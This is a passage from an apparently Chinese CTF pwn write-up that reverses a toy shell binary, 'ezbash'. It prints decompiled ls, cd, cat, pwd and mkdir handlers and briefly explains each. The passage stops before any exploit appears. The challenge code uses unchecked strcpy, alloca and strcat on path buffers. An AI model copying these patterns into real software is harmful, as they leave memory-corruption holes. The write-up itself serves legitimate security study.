[rbp-50h]</span></span><br><span class=\"line\">  __int64 v20; <span class=\"comment\">// [rsp+60h] [rbp-48h]</span></span><br><span class=\"line\">  __int64 v21; <span class=\"comment\">// [rsp+68h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *dest; <span class=\"comment\">// [rsp+70h] [rbp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> delim[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+7Eh] [rbp-2Ah] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v24; <span class=\"comment\">// [rsp+80h] [rbp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  comment = cmd;</span><br><span class=\"line\">  v24 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v17 = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">  v19 = cuurr_pos;</span><br><span class=\"line\">  v20 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v12 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  nums = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(delim, <span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( comment[++nums] )                     <span class=\"comment\">// 只有ls 就会跳过</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(comment[nums]) &lt;= v14 )</span><br><span class=\"line\">      v2 = v14;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      v2 = <span class=\"built_in\">strlen</span>(comment[nums]) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    v14 = v2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v21 = v14 - <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  v10[<span class=\"number\">0</span>] = v14;</span><br><span class=\"line\">  v10[<span class=\"number\">1</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">16</span> * ((v14 + <span class=\"number\">15LL</span>) / <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v10 != (v10 - (v3 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  v4 = alloca(v3 &amp; <span class=\"number\">0xFFF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (v3 &amp; <span class=\"number\">0xFFF</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    *(&amp;v10[<span class=\"number\">-1</span>] + (v3 &amp; <span class=\"number\">0xFFF</span>)) = *(&amp;v10[<span class=\"number\">-1</span>] + (v3 &amp; <span class=\"number\">0xFFF</span>));</span><br><span class=\"line\">  dest = v10;</span><br><span class=\"line\">  v16 = nums - <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    info_ls();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  nums = <span class=\"number\">1</span>;</span><br><span class=\"line\">LABEL_44:</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums &lt;= v16 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v14 = <span class=\"built_in\">strlen</span>(comment[nums]);</span><br><span class=\"line\">    v13 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(dest, comment[nums]);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( s1 = strtok(dest, delim); ; s1 = strtok(<span class=\"number\">0LL</span>, delim) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !s1 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">LABEL_43:</span><br><span class=\"line\">        cuurr_pos = v19;</span><br><span class=\"line\">        ++nums;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_44;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      v17 = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s1, <span class=\"string\">&quot;.&quot;</span>) )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_16;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s1, off_4077) )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      v12 = findfile(&amp;v17, s1);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v12 != <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: cannot access &#x27;%s&#x27;: No such file or directory\\n&quot;</span>, s1);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_43;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( checkfile(v17) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v7 = v14;</span><br><span class=\"line\">        v8 = <span class=\"built_in\">strlen</span>(s1);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(&amp;dest[v7 - v8], s1) )</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(v17-&gt;name);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">          <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: cannot access &#x27;%s&#x27;: Not a directory\\n&quot;</span>, comment[nums]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v16 &gt; <span class=\"number\">1</span> &amp;&amp; nums &lt; v16 )</span><br><span class=\"line\">          <span class=\"built_in\">putchar</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_43;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( checkfolder(v17) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        cuurr_pos = v17;</span><br><span class=\"line\">        v9 = <span class=\"built_in\">strlen</span>(s1);</span><br><span class=\"line\">        v13 += v9 + <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">LABEL_32:</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !comment[nums][v13 - <span class=\"number\">1</span>] || comment[nums][v13 - <span class=\"number\">1</span>] == <span class=\"number\">47</span> &amp;&amp; !comment[nums][v13] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v16 &gt; <span class=\"number\">1</span> )</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s:\\n&quot;</span>, comment[nums]);</span><br><span class=\"line\">        info_ls();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v16 &gt; <span class=\"number\">1</span> &amp;&amp; nums &lt; v16 )</span><br><span class=\"line\">        <span class=\"built_in\">putchar</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( cuurr_pos-&gt;futher )</span><br><span class=\"line\">      cuurr_pos = cuurr_pos-&gt;futher;</span><br><span class=\"line\">LABEL_16:</span><br><span class=\"line\">    v6 = <span class=\"built_in\">strlen</span>(s1);</span><br><span class=\"line\">    v13 += v6 + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>讲真 ls 代码很长，但是没啥用，特别是那个 alloca，就是浪费时间。</p>\n<h4 id=\"cd\"><a class=\"markdownIt-Anchor\" href=\"#cd\">#</a> cd</h4>\n<p>cd 也是一个简单的跳到跳到某个目录下，实际就是更改下那两个变量，以及链表的遍历。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">acd</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v1; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v3; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> len_name; <span class=\"comment\">// [rsp+18h] [rbp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *s1; <span class=\"comment\">// [rsp+20h] [rbp-30h]</span></span><br><span class=\"line\">  file *pos; <span class=\"comment\">// [rsp+28h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> delim[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+36h] [rbp-1Ah] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v8; <span class=\"comment\">// [rsp+38h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( cmd[<span class=\"number\">2</span>] )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fwrite(<span class=\"string\">&quot;ezbash: too many arguments\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x1B</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">strcpy</span>(delim, <span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( s1 = strtok(cmd[<span class=\"number\">1</span>], delim); s1; s1 = strtok(<span class=\"number\">0LL</span>, delim) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(s1, <span class=\"string\">&quot;.&quot;</span>) )                  <span class=\"comment\">// 当前目录下或者父目录</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s1, off_4077) )          <span class=\"comment\">// ../</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( cuurr_pos-&gt;futher )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              len_name = <span class=\"built_in\">strlen</span>(cuurr_pos-&gt;name);</span><br><span class=\"line\">              cur_position_addr[(<span class=\"built_in\">strlen</span>(cur_position_addr) - <span class=\"number\">1</span> - len_name)] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              cuurr_pos = cuurr_pos-&gt;futher;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            pos = cuurr_pos-&gt;firstson;          <span class=\"comment\">// ./</span></span><br><span class=\"line\">            ((&amp;check_error + <span class=\"number\">1</span>))();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v1 )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: %s: No such file or directory\\n&quot;</span>, s1);</span><br><span class=\"line\">              <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> ( pos &amp;&amp; <span class=\"built_in\">strcmp</span>(pos-&gt;name, s1) )<span class=\"comment\">// 参数的第一的目标位置文件夹</span></span><br><span class=\"line\">              pos = pos-&gt;next_bro;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !checkfolder(pos) )            <span class=\"comment\">// 检查是否为目录</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              fwrite(<span class=\"string\">&quot;something wrong happened\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">              <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            cuurr_pos = pos;</span><br><span class=\"line\">            v3 = <span class=\"built_in\">strlen</span>(cur_position_addr);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v3 + <span class=\"built_in\">strlen</span>(pos-&gt;name) &lt;= <span class=\"number\">0x50</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">strcat</span>(cur_position_addr, pos-&gt;name);</span><br><span class=\"line\">              *&amp;cur_position_addr[<span class=\"built_in\">strlen</span>(cur_position_addr)] = <span class=\"string\">&#x27;/&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: expected argument\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x1A</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"cat\"><a class=\"markdownIt-Anchor\" href=\"#cat\">#</a> cat</h4>\n<p>cat 会输出文件中的数据，采用的是 puts，只会输出字符串。为实现 cat 重定向到文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">acat</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v2; <span class=\"comment\">// rsp</span></span><br><span class=\"line\">  _BYTE v4[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+8h] [rbp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> **comment; <span class=\"comment\">// [rsp+10h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v6; <span class=\"comment\">// [rsp+1Fh] [rbp-59h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// [rsp+20h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> num; <span class=\"comment\">// [rsp+24h] [rbp-54h]</span></span><br><span class=\"line\">  file *v9; <span class=\"comment\">// [rsp+28h] [rbp-50h]</span></span><br><span class=\"line\">  __int64 v10; <span class=\"comment\">// [rsp+30h] [rbp-48h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *dest; <span class=\"comment\">// [rsp+38h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v12; <span class=\"comment\">// [rsp+40h] [rbp-38h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  comment = cmd;</span><br><span class=\"line\">  v12 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  num = <span class=\"number\">0</span>;                                      <span class=\"comment\">// 参数的数目</span></span><br><span class=\"line\">  v6 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7 = <span class=\"number\">0</span>;                                       <span class=\"comment\">// v7 最大参数的长度</span></span><br><span class=\"line\">  v9 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( comment[++num] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(comment[num]) &gt; v7 )</span><br><span class=\"line\">      v7 = <span class=\"built_in\">strlen</span>(comment[num]) + <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v10 = v7 - <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  v1 = <span class=\"number\">16</span> * ((v7 + <span class=\"number\">15LL</span>) / <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v4 != &amp;v4[-(v1 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL)] )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  v2 = alloca(v1 &amp; <span class=\"number\">0xFFF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (v1 &amp; <span class=\"number\">0xFFF</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    *&amp;v4[(v1 &amp; <span class=\"number\">0xFFF</span>) - <span class=\"number\">8</span>] = *&amp;v4[(v1 &amp; <span class=\"number\">0xFFF</span>) - <span class=\"number\">8</span>];</span><br><span class=\"line\">  dest = v4;</span><br><span class=\"line\">  num = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !comment[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: missing operand\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x18</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( comment[num] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v9 = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(dest, comment[num]);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( v9 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(dest, v9-&gt;name) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v9-&gt;context )</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(v9-&gt;context);</span><br><span class=\"line\">        v6 = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      v9 = v9-&gt;next_bro;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 != <span class=\"number\">1</span> )</span><br><span class=\"line\">      <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: %s: No such file or directory\\n&quot;</span>, comment[num]);</span><br><span class=\"line\">    ++num;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"pwd\"><a class=\"markdownIt-Anchor\" href=\"#pwd\">#</a> pwd</h4>\n<p>仅仅只是输出当前的路径</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">apwd</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(cur_position_addr);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"exithelp\"><a class=\"markdownIt-Anchor\" href=\"#exithelp\">#</a> exit,help</h4>\n<p>没什么可以说的。</p>\n<h4 id=\"mkdir\"><a class=\"markdownIt-Anchor\" href=\"#mkdir\">#</a> mkdir</h4>\n<p>在当前的目录下创建一个字目录，并把她 link 进 firstson 的链表，采用的是头插法。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">amkdir</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v1; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v3[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+1Ah] [rbp-16h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  file *first_son; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  file *newfile; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">1</span>;</span><br><span class=\"line\">  qmemcpy(v3, <span class=\"string\">&quot;./&quot;</span>, <span class=\"keyword\">sizeof</span>(v3));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: missing operand\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x18</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( cmd[v4] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    first_son = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strchr</span>(cmd[v4], v3[<span class=\"number\">0</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"built_in\">strchr</span>(cmd[v4], v3[<span class=\"number\">1</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ((&amp;check_error + <span class=\"number\">1</span>))();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v1 != <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, aEzbashCannotCr, cmd[v4++]);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        newfile = calloc40();</span><br><span class=\"line\">        newfile-&gt;flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">        newfile-&gt;futher = cuurr_pos;</span><br><span class=\"line\">        copy_name(newfile, cmd[v4]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( cuurr_pos-&gt;firstson )</span><br><span class=\"line\">          link(first_son, newfile);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">          cuurr_pos-&gt;firstson = newfile;</span><br><span class=\"line\">        ++v4;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"touch\"><a class=\"markdownIt-Anchor\" href=\"#touch\">#</a> touch</h4>\n<p>创建一个空文件，与 mkdir 的操作类似</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span 